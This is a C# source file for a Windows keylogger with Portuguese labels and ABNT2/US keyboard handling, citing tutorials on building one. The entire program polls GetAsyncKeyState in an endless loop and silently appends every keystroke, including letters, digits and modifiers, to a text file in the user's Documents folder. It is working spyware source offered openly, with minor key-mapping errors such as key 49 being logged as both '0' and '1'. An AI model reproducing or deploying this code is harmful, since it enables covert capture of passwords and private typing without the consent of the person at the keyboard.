using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace KeyLogger
{
    //Separa por teclado ABNT2 e Americano

    // 1- https://www.youtube.com/watch?v=j0sxcsxXJkY
    // 2- https://www.youtube.com/watch?v=Uu0DEnao8F0
    // 3- https://www.youtube.com/watch?v=0K3p9ulNYv4

    //https://rafaelomarques.wordpress.com/2015/04/25/keylogger-em-c/
    //https://github.com/ceb10n/OopsMyKeyboard/
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        public static TipoTeclado teclado = TipoTeclado.ABNT2;
        static void Main(string[] args)
        {
            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }

            string path = Path.Combine(filepath + @"\registerlvs.txt");

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {

                }
            }

            var pode = true;
            while (pode)
            {
                Thread.Sleep(5);
                for (int i = 2; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 32769)
                    {
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            //Console.Write(@$"{i} | ");
                            sw.Write(" | ");

                            if (i >= 65 && i < 91)
                            {
                                //Console.Write((char)i);
                                sw.Write((char)i);
                            }
                            else
                            {
                                if (i == 1)
                                {
                                    //Console.Write("Clicou");
                                    sw.Write("Clicou");
                                }

                                if (teclado == TipoTeclado.Americano)
                                {
                                    if (i == 222)
                                    {
                                        //Console.Write("'");
                                        sw.Write("'");
                                    }
                                }
                                else
                                {
                                    if (i == 222)
                                    {
                                        //Console.Write("~");
                                        sw.Write("~");
                                    }
                                }

                                if (i == 188)
                                {
                                    //Console.Write(",");
                                    sw.Write(",");
                                }

                                if (i == 190)
                                {
                                    //Console.Write(".");
                                    sw.Write(".");
                                }

                                if (teclado == TipoTeclado.Americano)
                                {
                                    if (i == 191)
                                    {
                                        //Console.Write("/");
                                        sw.Write("/");
                                    }
                                }
                                else
                                {
                                    if (i == 191)
                                    {
                                        //Console.Write(";");
                                        sw.Write(";");
                                    }
                                }

                                if (i == 27)
                                {
                                    //Console.Write("ESC");
                                    sw.Write("ESC");
                                }

                                if (i == 112)
                                {
                                    //Console.Write("F1");
                                    sw.Write("F1");
                                }

                                if (i == 113)
                                {
                                    //Console.Write("F2");
                                    sw.Write("F2");
                                }

                                if (i == 114)
                                {
                                    //Console.Write("F3");
                                    sw.Write("F3");
                                }

                                if (i == 115)
                                {
                                    //Console.Write("F4");
                                    sw.Write("F4");
                                }

                                if (i == 116)
                                {
                                    //Console.Write("F5");
                                    sw.Write("F5");
                                }

                                if (i == 117)
                                {
                                    //Console.Write("F6");
                                    sw.Write("F6");
                                }

                                if (i == 118)
                                {
                                    //Console.Write("F7");
                                    sw.Write("F7");
                                }

                                if (i == 119)
                                {
                                    //Console.Write("F8");
                                    sw.Write("F8");
                                }

                                if (i == 193)
                                {
                                    //Console.Write("/");
                                    sw.Write("/");
                                }

                                if (i == 120)
                                {
                                    //Console.Write("F9");
                                    sw.Write("F9");
                                }

                                if (i == 121)
                                {
                                    //Console.Write("F10");
                                    sw.Write("F10");
                                }

                                if (i == 122)
                                {
                                    //Console.Write("F11");
                                    sw.Write("F11");
                                }

                                if (i == 37)
                                {
                                    //Console.Write("Esquerda");
                                    sw.Write("Esquerda");
                                }

                                if (i == 38)
                                {
                                    //Console.Write("Acima");
                                    sw.Write("Acima");
                                }

                                if (i == 39)
                                {
                                    //Console.Write("Direita");
                                    sw.Write("Direita");
                                }

                                if (i == 40)
                                {
                                    //Console.Write("Abaixo");
                                    sw.Write("Abaixo");
                                }

                                if (i == 123)
                                {
                                    //Console.Write("F12 / ENTER");
                                    sw.Write("F12 / ENTER");
                                }

                                if (i == 192)
                                {
                                    //Console.Write("`");
                                    sw.Write("`");
                                }

                                if (i == 49)
                                {
                                    //Console.Write("0");
                                    sw.Write("0");
                                }

                                if (i == 49)
                                {
                                    //Console.Write("1");
                                    sw.Write("1");
                                }

                                if (i == 50)
                                {
                                    //Console.Write("2");
                                    sw.Write("2");
                                }

                                if (i == 51)
                                {
                                    //Console.Write("3");
                                    sw.Write("3");
                                }

                                if (i == 52)
                                {
                                    //Console.Write("4");
                                    sw.Write("4");
                                }

                                if (i == 53)
                                {
                                    //Console.Write("5");
                                    sw.Write("5");
                                }

                                if (i == 54)
                                {
                                    //Console.Write("6");
                                    sw.Write("6");
                                }

                                if (i == 55)
                                {
                                    //Console.Write("7");
                                    sw.Write("7");
                                }

                                if (i == 56)
                                {
                                    //Console.Write("8");
                                    sw.Write("8");
                                }

                                if (i == 57)
                                {
                                    //Console.Write("9");
                                    sw.Write("9");
                                }

                                if (i == 189)
                                {
                                    //Console.Write("-");
                                    sw.Write("-");
                                }

                                if (i == 187)
                                {
                                    //Console.Write("=");
                                    sw.Write("=");
                                }

                                if (i == 8)
                                {
                                    //Console.Write("Apaga");
                                    sw.Write("Apaga");
                                }

                                if (i == 48)
                                {
                                    //Console.Write("0");
                                    sw.Write("0");
                                }

                                if (i == 160)
                                {
                                    //Console.Write("Shift Left");
                                    sw.Write("Shift Left");
                                }

                                if (i == 161)
                                {
                                    //Console.Write("Shif Right");
                                    sw.Write("Shif Right");
                                }

                                if (i == 164)
                                {
                                    //Console.Write("Alt Left");
                                    sw.Write("Alt Left");
                                }

                                if (i == 165)
                                {
                                    //Console.Write("Alt Right");
                                    sw.Write("Alt Right");
                                }

                                if (i == 162)
                                {
                                    //Console.Write("Ctrl Left");
                                    sw.Write("Ctrl Left");
                                }

                                if (i == 163)
                                {
                                    //Console.Write("Ctrl Right");
                                    sw.Write("Ctrl Right");
                                }

                                if (i == 32)
                                {
                                    //Console.Write("Espaço");
                                    sw.Write("Espaço");
                                }

                                if (i == 144)
                                {
                                    //Console.Write("New Lock");
                                    sw.Write("New Lock");
                                }

                                if (teclado == TipoTeclado.Americano)
                                {
                                    if (i == 97)
                                    {
                                        //Console.Write("Calc 1");
                                        sw.Write("Calc 1");
                                    }
                                }


                                if (i == 98)
                                {
                                    //Console.Write("Calc 2");
                                    sw.Write("Calc 2");
                                }

                                //if (i == 99)
                                //{
                                //    //Console.Write("Calc 3");
                                //    sw.Write("Calc 3");
                                //}

                                if (i == 100)
                                {
                                    //Console.Write("Calc 4");
                                    sw.Write("Calc 4");
                                }

                                if (i == 101)
                                {
                                    //Console.Write("Calc 5");
                                    sw.Write("Calc 5");
                                }

                                if (i == 102)
                                {
                                    //Console.Write("Calc 6");
                                    sw.Write("Calc 6");
                                }

                                if (i == 103)
                                {
                                    //Console.Write("Calc 7");
                                    sw.Write("Calc 7");
                                }

                                if (i == 104)
                                {
                                    //Console.Write("Calc 8");
                                    sw.Write("Calc 8");
                                }

                                if (i == 105)
                                {
                                    //Console.Write("Calc 9");
                                    sw.Write("Calc 9");
                                }

                                if (i == 13)
                                {
                                    //Console.Write("Enter");
                                    sw.Write("Enter");
                                }

                                if (i == 35)
                                {
                                    //Console.Write("End");
                                    sw.Write("End");
                                }

                                if (i == 45)
                                {
                                    //Console.Write("Insert");
                                    sw.Write("Insert");
                                }

                                if (i == 46)
                                {
                                    //Console.Write("Delete");
                                    sw.Write("Delete");
                                }

                                if (i == 34)
                                {
                                    //Console.Write("Page Down");
                                    sw.Write("Page Down");
                                }

                                if (i == 12)
                                {
                                    //Console.Write("Calc Meio");
                                    sw.Write("Calc Meio");
                                }

                                if (i == 36)
                                {
                                    //Console.Write("Home");
                                    sw.Write("Home");
                                }

                                if (i == 33)
                                {
                                    //Console.Write("Page Up");
                                    sw.Write("Page Up");
                                }

                                if (i == 20)
                                {
                                    //Console.Write("Caps Lock");
                                    sw.Write("Caps Lock");
                                }

                                if (i == 09)
                                {
                                    //Console.Write("Tab");
                                    sw.Write("Tab");
                                }

                                if (i == 91)
                                {
                                    //Console.Write("Win Left");
                                    sw.Write("Win Left");
                                }

                                if (i == 17)
                                {
                                    //Console.Write("Alt Gr");
                                    sw.Write("Alt Gr");
                                }

                                if (i == 44)
                                {
                                    //Console.Write("Print Screen");
                                    sw.Write("Print Screen");
                                }

                                if (i == 111)
                                {
                                    //Console.Write("Calc /");
                                    sw.Write("Calc /");
                                }

                                if (i == 106)
                                {
                                    //Console.Write("Calc *");
                                    sw.Write("Calc *");
                                }

                                if (i == 109)
                                {
                                    //Console.Write("Calc -");
                                    sw.Write("Calc -");
                                }

                                if (i == 107)
                                {
                                    //Console.Write("Calc +");
                                    sw.Write("Calc +");
                                }

                                if (teclado == TipoTeclado.Americano)
                                {
                                    if (i == 110)
                                    {
                                        //Console.Write("Calc .");
                                        sw.Write("Calc .");
                                    }
                                }

                                if (i == 96)
                                {
                                    //Console.Write("Calc 0");
                                    sw.Write("Calc 0");
                                }

                               
                                if (teclado == TipoTeclado.Americano)
                                {
                                    if (i == 220)
                                    {
                                        //Console.Write("\\");
                                        sw.Write("\\");
                                    }
                                }
                                else
                                {
                                    if (i == 220)
                                    {
                                        //Console.Write("]");
                                        sw.Write("]");
                                    }
                                }



                                if (teclado == TipoTeclado.Americano)
                                {
                                    if (i == 221)
                                    {
                                        //Console.Write("]");
                                        sw.Write("]");
                                    }
                                }
                                else
                                {
                                    if (i == 221)
                                    {
                                        //Console.Write("[");
                                        sw.Write("[");
                                    }
                                }


                                if (teclado == TipoTeclado.Americano)
                                {
                                    if (i == 219)
                                    {
                                        //Console.Write("[");
                                        sw.Write("[");
                                    }
                                }
                                else
                                {
                                    if (i == 219)
                                    {
                                        //Console.Write("'");
                                        sw.Write("'");
                                    }
                                }

                                
                                if (teclado == TipoTeclado.Americano)
                                {
                                    if (i == 186)
                                    {
                                        //Console.Write(";");
                                        sw.Write(";");
                                    }
                                }
                                else
                                {
                                    if (i == 186)
                                    {
                                        //Console.Write("Cedilha");
                                        sw.Write("Cedilha");
                                    }
                                }


                                if (i == 93)
                                {
                                    //Console.Write("Menu");
                                    sw.Write("Menu");
                                }

                                if (teclado == TipoTeclado.ABNT2)
                                {
                                    if (i == 194)
                                    {
                                        //Console.Write("Calc .");
                                        sw.Write("Calc .");
                                    }
                                }


                            }

                            //Console.Write(" | ");
                            sw.Write(" | ");
                        }
                    }
                }
            }
        }
    }

    public enum TipoTeclado
    {
        ABNT2,
        Americano
    }
}
